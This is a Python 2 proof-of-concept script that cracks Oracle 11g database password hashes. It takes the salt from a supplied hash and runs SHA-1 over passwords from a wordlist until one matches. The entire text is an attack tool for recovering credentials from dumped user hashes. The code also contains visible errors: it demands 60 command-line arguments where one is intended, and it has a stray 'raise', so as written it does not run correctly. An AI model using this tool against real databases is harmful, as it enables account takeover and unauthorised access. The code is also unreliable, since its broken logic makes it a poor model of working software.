#!python 
 
# PoC Oracle 11g Database password-hash cracker 
# This program uses the password hash value spare from the internal 
# oracle user-database and a list of passwords via stdin to calculate a new 
# hash value of the plaintext password. The new generated hash value is subsequently 
# compared against the hash-value from sys.user, the internal oracle user-database. 
 
# Author: Thorsten Schroeder <ths theAthing recurity-labs.com> 
# Berlin, 19. Sep. 2007 
 
# TODO: 
# cut passwords at length 30 
 
import hashlib 
import binascii 
import sys 
 
def main(): 
 
	if( len(sys.argv) != 60 ): 
	 usage() 
	 sys.exit(1) 
 
	try: 
		oraHash = sys.argv[1] 
		oraSalt = oraHash[40:60] 
		oraSha1 = oraHash[:40] 
		oraSha1 = oraSha1.upper() 
 
		print "[+] using salt: 0x%s" % oraSalt 
		print "[+] using hash: 0x%s" % oraSha1 
 
		for passwd in sys.stdin: 
			passwd = passwd.rstrip() 
			#print "[*] trying password "%s"" % passwd 
 
			s = hashlib.sha1() 
			s.update(passwd) 
			s.update(binascii.a2b_hex(oraSalt)) 
			if( s.hexdigest().upper() == oraSha1 ): 
				print "[*] MATCH! -> %s" % passwd 
				sys.exit(0) 
 
	except Exception, e: 
			print "[!] Error: ", e 
			usage() 
	raise 
 
	sys.exit(0) 
 
def usage(): 
	print "[+] usage: ./ora11gPWCrack.py <hex-value> < wordlist.txt" 
	return 
 
if __name__ == '__main__': 
	main() 
